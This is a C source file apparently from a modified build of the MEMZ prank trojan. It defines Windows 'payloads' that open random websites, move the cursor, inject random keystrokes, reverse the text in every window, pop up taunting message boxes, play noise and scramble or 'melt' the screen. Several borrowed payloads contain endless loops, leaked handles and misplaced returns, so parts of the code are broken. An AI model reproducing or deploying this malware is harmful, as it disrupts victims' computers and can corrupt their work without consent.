#include "memz.h"


PAYLOAD payloads[] = {
	{ payloadExecute, 30000 },
	{ payloadCursor, 30000 },
	{ payloadKeyboard, 20000 },
	{ payloadSound, 50000 },
	{ payloadBlink, 30000 },
	{ payloadMessageBox, 20000 },
	{ payloadDrawErrors, 10000 },
	{ payloadChangeText, 40000 },
	{ payloadVineMEMZCrazyBus, 28000 },
    { payloadScreenGlitches, 15000 },
	{ payloadScreenmelting, 29000 },
	{ payloadPIP, 30000 },
	{ payloadPuzzle, 15000 },
	{ payloadBitBlt, 20000 },
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

DWORD WINAPI payloadThread(LPVOID parameter) {
#ifndef CLEAN
	int delay = 0;
	int times = 0;
	int runtime = 0;
#endif

	PAYLOAD *payload = (PAYLOAD*)parameter;

	for (;;) {
#ifdef CLEAN
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
			if (payload->delaytime++ >= payload->delay) {
				payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
				payload->delaytime = 0;
			}

			payload->runtime++;
		} else {
			 payload->runtime = 0;
			 payload->times = 0;
			 payload->delay = 0;
		}
#else
		if (delay-- == 0) {
			delay = (payload->payloadFunction)(times++, runtime);
		}

		runtime++;
#endif
		Sleep(10);
	}
}

int payloadExecute(PAYLOADFUNC) {
	PAYLOADHEAD

	ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);

	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
}

int payloadBlink(PAYLOADFUNC) {
	PAYLOADHEAD

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 100;
}

int payloadCursor(PAYLOADFUNC) {
	PAYLOADHEAD

	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));

	out: return 2;
}
////Credits and thanks to TheMaynMike
///https://github.com/TheMaynMike/ScreenGlitches
int payloadScreenGlitches(PAYLOADFUNC) {
	PAYLOADHEAD

	HDC hdc = GetDC(GetDesktopWindow());
	int ScrW = GetSystemMetrics(SM_CXSCREEN);
	int ScrH = GetSystemMetrics(SM_CYSCREEN);

	while (true)
	{
		for (int i = 0;; i++, i %= 3)
		{
			for (int c = 0; c < rand() % 16; c++)
			{
				int y = rand() % ScrH;
				HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));

				SelectObject(hdc, brush);
				BitBlt(hdc, 0, y, ScrW, 300, hdc, rand() % 61 - 30, y, SRCCOPY);
				PatBlt(hdc, 0, y, ScrW, 300, PATINVERT);
			}

			if (!i) RedrawWindow(0, 0, 0, 133);
		}
	}
}

int payloadMessageBox(PAYLOADFUNC) {
	PAYLOADHEAD

		CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);

out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

int payloadChangeText(PAYLOADFUNC) {
	PAYLOADHEAD
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

	out: return 50;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}
	
	GlobalFree(str);

	return TRUE;
}

int payloadSound(PAYLOADFUNC) {
	PAYLOADHEAD

	// There seems to be a bug where toggling ALL payloads kills the sound output on some systems.
	// I don't know why this happens, but using SND_SYNC seems to fix the bug.
	// But the sound is not not as fast as before. I hope there is another way to fix it without slowing down the payload.
	// As this only happens for the enable-disable part, I will only include that in the clean build as a workaround.
	PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
	out: return 20 + (random() % 20);
}

int payloadPuzzle(PAYLOADFUNC) {
	PAYLOADHEAD
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 200.0 / (times / 5.0 + 1) + 3;
}

int payloadKeyboard(PAYLOADFUNC) {
	PAYLOADHEAD

	INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	out: return 300 + (random() % 400);
}
////Credits and thanks to 0xDEADBEEF
///http://www.rohitab.com/discuss/topic/23191-screen-melter/
int payloadScreenmelting(PAYLOADFUNC) {
	PAYLOADHEAD
	HDC dcDesktop = GetWindowDC(NULL);
	int scrX = GetSystemMetrics(SM_CXSCREEN);
	int scrY = GetSystemMetrics(SM_CYSCREEN);

	srand(GetTickCount());

	for (;;)
	{
		int x = rand() % scrX;
		for (int y = scrY; y>0; y--)
			SetPixel(dcDesktop, x, y, GetPixel(dcDesktop, x, y - 3));
	}
	return 0;
}

int payloadPIP(PAYLOADFUNC) {
	PAYLOADHEAD

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}
////Credits and thanks to JLee79 and Michael Petrotta
///https://stackoverflow.com/questions/2798922/storage-location-of-yellow-blue-shield-icon
///https://chowdera.com/2021/04/20210430135939765k.html
int payloadDrawErrors(PAYLOADFUNC) {
	PAYLOADHEAD

	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_INFORMATION));
	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_APPLICATION));
	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_HAND));
		DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_SHIELD));
		DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_QUESTION));
	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_ERROR));
		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_APPLICATION));
		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_SHIELD));
		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_HAND));
		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_QUESTION));
		
	}
	
	ReleaseDC(hwnd, hdc);

	out: return 2;
}
/////Credits and thanks to Faliture 
////https://github.com/Faliture/BitBlt/blob/main/BitBlt/BitBlt.cpp
int payloadBitBlt(PAYLOADFUNC) {

	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(NULL);
		BitBlt(desktop, -1,1, xs, ys, upHdc, 2,2, 0x999999);
	}
}

////Credits and thanks to Dobby233Liu and Leurak
////https://github.com/Dobby233Liu/VineMEMZ/blob/master/VCProject/MEMZ/payloads.cpp
int payloadVineMEMZCrazyBus(PAYLOADFUNC) {
	
		const int samples = 44100;

	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, samples, samples, 1, 8, 0 };

	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);

	const int bufsize = samples * 30;
	char *wavedata = (char *)LocalAlloc(0, bufsize);

	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));

	for (;;) {
		int freq1 = 0, freq2 = 0, freq3 = 0;
		int sample1 = 0, sample2 = 0, sample3 = 0;
		for (int i = 0; i < bufsize; i++) {
			if (i % (int)(samples * 0.166) == 0) {
				freq1 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 200))) / 2;
				freq2 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 250))) / 2;
				freq3 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 325))) / 2;
			}

			sample1 = (i % freq1 < freq1 / 2) ? -127 : 127;
			sample2 = (i % freq2 < freq2 / 2) ? -127 : 127;
			sample3 = (i % freq3 < freq3 / 2) ? -127 : 127;

			wavedata[i] = (unsigned char)(((sample1 + sample2 + sample3)*0.1) + 127);
		}

		waveOutWrite(hwo, &hdr, sizeof(hdr));

			return 0;
		}
	}
